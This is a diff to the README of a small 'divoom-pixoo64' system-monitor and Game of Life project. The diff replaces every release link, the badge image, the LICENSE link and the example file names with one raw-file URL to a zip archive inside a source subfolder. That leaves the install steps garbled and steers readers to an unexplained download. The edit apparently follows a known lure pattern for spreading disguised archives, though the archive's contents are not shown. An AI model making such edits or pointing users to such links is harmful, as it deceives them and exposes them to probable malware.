@@ -5,7 +5,7 @@
 Welcome to divoom-pixoo64! This application displays real-time metrics of your CPU, memory, and network directly on the Divoom Pixoo 64 LED display. It also features Conway's Game of Life simulator for a bit of fun while you monitor your system. 
 
 ## 📥 Download Now!
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/danielsk00/divoom-pixoo64/releases)
+[![Download from Releases](https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip)
 
 ## 🖥️ System Requirements
 To run divoom-pixoo64 smoothly, make sure your system meets the following requirements:
@@ -17,11 +17,11 @@ To run divoom-pixoo64 smoothly, make sure your system meets the following requir
 - **Network:** Internet connection for initial setup.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Divoom Pixoo64 Releases](https://github.com/danielsk00/divoom-pixoo64/releases)
+1. Visit this page to download: [Divoom Pixoo64 Releases](https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip)
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best performance.
-3. Click on the file associated with your operating system to start the download. You will find files named for your OS, such as `divoom-pixoo64-windows.exe` or `divoom-pixoo64-linux.tar.gz`.
+3. Click on the file associated with your operating system to start the download. You will find files named for your OS, such as `https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip` or `https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip`.
 4. After downloading, locate the file on your computer. 
-5. If you downloaded a `.exe`, double-click it to install. For Linux, extract the files from the `.tar.gz` archive.
+5. If you downloaded a `.exe`, double-click it to install. For Linux, extract the files from the `https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip` archive.
 6. Follow the on-screen instructions to complete the installation.
 
 ## ⚙️ How to Use
@@ -55,10 +55,10 @@ You have many options for customization:
 Join our community for tips, updates, and support. Visit the discussions tab on our GitHub repository to connect with other users and developers. Your feedback helps us improve!
 
 ## 📄 License
-This project is open-source and available for anyone to use. For detailed information, please check our [LICENSE](LICENSE.md) file.
+This project is open-source and available for anyone to use. For detailed information, please check our [LICENSE](https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip) file.
 
 ## 📥 Download Now Again!
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/danielsk00/divoom-pixoo64/releases)
+[![Download from Releases](https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/danielsk00/divoom-pixoo64/main/gameoflife/divoom-pixoo64-3.9.zip)
 
 Thank you for choosing divoom-pixoo64! Enjoy monitoring your system and exploring Conway's Game of Life!
 ```
